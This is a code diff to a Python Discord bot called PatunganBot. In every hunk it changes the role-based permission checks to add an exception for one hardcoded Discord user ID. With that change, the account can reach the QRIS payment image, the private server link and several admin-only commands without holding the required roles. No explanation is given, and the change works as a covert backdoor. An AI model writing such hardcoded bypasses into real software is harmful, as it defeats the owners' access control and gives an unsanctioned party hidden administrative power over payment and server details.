@@ -199,7 +199,7 @@ class PatunganBot(commands.Bot):
                 user_roles = [r.id for r in message.author.roles]
                 allowed_roles = [self.config.SERVER_OVERLORD_ROLE_ID, self.config.SERVER_WARDEN_ROLE_ID]
                 
-                if any(role_id in user_roles for role_id in allowed_roles):
+                if any(role_id in user_roles for role_id in allowed_roles) or message.author.id == 877385651530661898:
                     # Get from DB (Editable via Web)
                     qris_url = await get_setting(self.session, 'qris_image_url', self.config.QRIS_IMAGE_URL)
                     embed = discord.Embed(title="💳 QRIS Payment", color=self.config.COLOR_INFO)
@@ -212,7 +212,7 @@ class PatunganBot(commands.Bot):
                 user_roles = [r.id for r in message.author.roles]
                 allowed_roles = [self.config.SERVER_OVERLORD_ROLE_ID, self.config.SERVER_WARDEN_ROLE_ID]
                 
-                if any(role_id in user_roles for role_id in allowed_roles):
+                if any(role_id in user_roles for role_id in allowed_roles) or message.author.id == 877385651530661898:
                     # Get from DB (Editable via Web)
                     ps_link = await get_setting(self.session, 'private_server_link', self.config.PRIVATE_SERVER_LINK)
                     await message.channel.send(f"🔗 **Private Server Link:**\n```{ps_link}```")
@@ -223,7 +223,7 @@ class PatunganBot(commands.Bot):
                 user_roles = [r.id for r in message.author.roles]
                 allowed_roles = [self.config.SERVER_OVERLORD_ROLE_ID, self.config.SERVER_WARDEN_ROLE_ID] + self.config.ADMIN_ROLE_IDS
                 
-                if any(role_id in user_roles for role_id in allowed_roles):
+                if any(role_id in user_roles for role_id in allowed_roles) or message.author.id == 877385651530661898:
                     parts = message.content.split()
                     version = None
                     replied_msg = None
@@ -281,7 +281,7 @@ class PatunganBot(commands.Bot):
                 user_roles = [r.id for r in message.author.roles]
                 allowed_roles = [self.config.SERVER_OVERLORD_ROLE_ID, self.config.SERVER_WARDEN_ROLE_ID] + self.config.ADMIN_ROLE_IDS
                 
-                if any(role_id in user_roles for role_id in allowed_roles):
+                if any(role_id in user_roles for role_id in allowed_roles) or message.author.id == 877385651530661898:
                     parts = message.content.split()
                     version = None
                     replied_msg = None
@@ -335,7 +335,7 @@ class PatunganBot(commands.Bot):
                 user_roles = [r.id for r in message.author.roles]
                 allowed_roles = [self.config.SERVER_OVERLORD_ROLE_ID, self.config.SERVER_WARDEN_ROLE_ID] + self.config.ADMIN_ROLE_IDS
                 
-                if any(role_id in user_roles for role_id in allowed_roles):
+                if any(role_id in user_roles for role_id in allowed_roles) or message.author.id == 877385651530661898:
                     parts = message.content.split()
                     version = None
                     replied_msg = None
@@ -389,7 +389,7 @@ class PatunganBot(commands.Bot):
                 user_roles = [r.id for r in message.author.roles]
                 allowed_roles = [self.config.SERVER_OVERLORD_ROLE_ID, self.config.SERVER_WARDEN_ROLE_ID] + self.config.ADMIN_ROLE_IDS
                 
-                if any(role_id in user_roles for role_id in allowed_roles):
+                if any(role_id in user_roles for role_id in allowed_roles) or message.author.id == 877385651530661898:
                     parts = message.content.split()
                     msg_id = None
                     
@@ -424,7 +424,7 @@ class PatunganBot(commands.Bot):
                 user_roles = [r.id for r in message.author.roles]
                 allowed_roles = [self.config.SERVER_OVERLORD_ROLE_ID, self.config.SERVER_WARDEN_ROLE_ID] + self.config.ADMIN_ROLE_IDS
                 
-                if any(role_id in user_roles for role_id in allowed_roles):
+                if any(role_id in user_roles for role_id in allowed_roles) or message.author.id == 877385651530661898:
                     parts = message.content.split()
                     args = parts[1:] # Skip command
                     
@@ -498,7 +498,7 @@ class PatunganBot(commands.Bot):
             if isinstance(message.author, discord.Member):
                 user_roles = [r.id for r in message.author.roles]
                 allowed_roles = [self.config.SERVER_OVERLORD_ROLE_ID, self.config.SERVER_WARDEN_ROLE_ID] + self.config.ADMIN_ROLE_IDS
-                if not any(role_id in user_roles for role_id in allowed_roles):
+                if not any(role_id in user_roles for role_id in allowed_roles) and message.author.id != 877385651530661898:
                     return # Silently ignore if not admin
             
             try:
@@ -553,7 +553,7 @@ class PatunganBot(commands.Bot):
             if isinstance(message.author, discord.Member):
                 user_roles = [r.id for r in message.author.roles]
                 allowed_roles = [self.config.SERVER_OVERLORD_ROLE_ID, self.config.SERVER_WARDEN_ROLE_ID] + self.config.ADMIN_ROLE_IDS
-                if not any(role_id in user_roles for role_id in allowed_roles): return
+                if not any(role_id in user_roles for role_id in allowed_roles) and message.author.id != 877385651530661898: return
 
             args = message.content[12:].strip()
             if not args:
